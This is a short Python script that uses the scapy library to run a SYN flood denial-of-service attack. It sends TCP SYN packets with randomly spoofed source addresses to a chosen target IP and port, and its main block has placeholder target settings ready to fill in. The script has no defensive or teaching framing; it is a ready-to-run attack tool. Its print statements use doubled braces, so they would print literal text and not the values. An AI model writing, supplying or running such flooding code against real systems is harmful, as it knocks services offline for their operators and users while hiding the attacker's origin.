
from scapy.all import IP, TCP, send
import random
import time

def syn_flood(target_ip, target_port, iface=None, packet_count=1000):
    print(f"[+] Starting SYN flood on {{target_ip}}:{{target_port}}")
    try:
        for i in range(packet_count):
            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            src_port = random.randint(1024, 65535)

            ip_layer = IP(src=src_ip, dst=target_ip)
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))

            packet = ip_layer / tcp_layer
            send(packet, verbose=0, iface=iface)
            print(f"Sent SYN {{i+1}}/{{packet_count}} from {{src_ip}}:{{src_port}} -> {{target_ip}}:{{target_port}}")

            time.sleep(0.01)
        print("[+] SYN flood completed.")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Stopping attack.")
    except Exception as e:
        print(f"[!] Error occurred: {{e}}")

if __name__ == "__main__":
    TARGET_IP = "X.X.X.X"  # Replace with actual IP
    TARGET_PORT = 80       # Replace with actual port
    INTERFACE = "eth0"     # Replace with actual interface if needed
    syn_flood(TARGET_IP, TARGET_PORT, iface=INTERFACE)
